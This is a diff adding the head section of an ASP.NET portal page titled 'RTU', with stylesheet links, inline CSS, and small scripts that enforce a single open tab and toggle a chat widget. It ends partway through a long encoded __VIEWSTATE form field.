@@ -1,0 +1,1916 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head id="Head1"><title>
+	RTU
+</title><meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1" /><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" /><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" /><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10" /><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css" integrity="sha512-ZV9KawG2Legkwp3nAlxLIVFudTauWuBpC10uEafMHYL0Sarrz5A7G79kXh5+5+woxQ5HM559XX2UZjMJ36Wplg==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link href="include/bootstrap/style_outside-page.css" rel="stylesheet" /><link href="include/bootstrap/breaking-news-ticker.css" rel="stylesheet" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.5.7/slick.css" />
+    <style>
+        .dateformatbg {
+            padding-top: 28px !important;
+        }
+
+        .form_ul li em {
+            font-style: normal;
+            color: #f00;
+        }
+
+        .nav-tabs > li > a {
+            color: #fff;
+            font-size: 13px;
+        }
+
+        .panel-default > .panel-heading {
+            background-color: #0e365c;
+            border-color: #0e365c;
+        }
+
+        .nav > li > a:focus, .nav > li > a:hover {
+            background-color: #ff6e01;
+        }
+
+        .nav-tabs > li > a:hover {
+            border-color: #ff6e01;
+        }
+
+        .modal-backdrop {
+            position: fixed !important;
+        }
+
+        /*marquee {
+            height: auto !important;
+        }*/
+    </style>
+    <script type="text/javascript">
+        // Broadcast that you're opening a page.
+        localStorage.openpages = Date.now();
+        var onLocalStorageEvent = function (e) {
+            if (e.key == "openpages") {
+                // Listen if anybody else is opening the same page!
+                localStorage.page_available = Date.now();
+            }
+            if (e.key == "page_available") {
+                alert("Application is already running in another Tab.");
+                open(location, '_self').close();
+                close();
+            }
+        };
+        window.addEventListener('storage', onLocalStorageEvent, false);
+    </script>
+    <script type="text/javascript">
+        Redirect();
+        function HideShowBoat() {
+            Redirect();
+            document.getElementById("assistanceboat").style.display = "none";
+        }
+        function dispalyHide() {
+
+            document.getElementById("iframe1").style.display = "none";
+            document.getElementById("minus").style.display = "none";
+            document.getElementById("plus").style.display = "block";
+            document.getElementById("lvchat").style.display = "none";
+            document.getElementById("iconchat").style.display = "none";
+            document.getElementById("assistanceboat").style.display = "block";
+
+        }
+        function dispalyShow() {
+
+
+
+            document.getElementById("lvchat").style.display = "block";
+            document.getElementById("iframe1").style.display = "block";
+            document.getElementById("minus").style.display = "block";
+            document.getElementById("plus").style.display = "none";
+            document.getElementById("iconchat").style.display = "none";
+            document.getElementById("assistanceboat").style.display = "none";
+
+        }
+
+
+        function displayClose() {
+            document.getElementById("lvchat").style.display = "none";
+            document.getElementById("iconchat").style.display = "block";
+            document.getElementById("assistanceboat").style.display = "none";
+        }
+
+
+    </script>
+    <style>
+        .loginfooter-lgn {
+            position: static;
+        }
+
+        /*.fieldset-border {
+            margin-top: 260px;
+        }*/
+
+        .flashbg {
+            animation-name: flashbg;
+            animation-duration: 0.2s;
+            animation-timing-function: linear;
+            animation-iteration-count: infinite;
+            animation-direction: alternate;
+            animation-play-state: running;
+            padding: 5px;
+        }
+
+        @keyframes flashbg {
+            from {
+                background: #0029ff;
+            }
+
+            to {
+                background: #b701ff;
+            }
+        }
+
+        .col-sm-10-5 {
+            width: 80%;
+            float: left;
+            position: relative;
+            min-height: 1px;
+        }
+
+        .card-homes1 {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+            word-wrap: break-word;
+            margin: 1.5% 0 0 0;
+            background-clip: border-box;
+            border-radius: .35rem;
+        }
+    </style>
+<link href="App_Themes/skyblue/default.css" type="text/css" rel="stylesheet" /><link href="App_Themes/skyblue/GridviewScroll.css" type="text/css" rel="stylesheet" /><link href="App_Themes/skyblue/stylesheet.css" type="text/css" rel="stylesheet" /></head>
+<body class="rtu-home" onload="HideShowBoat()">
+    <form name="form1" method="post" action="./" id="form1">
+<div>
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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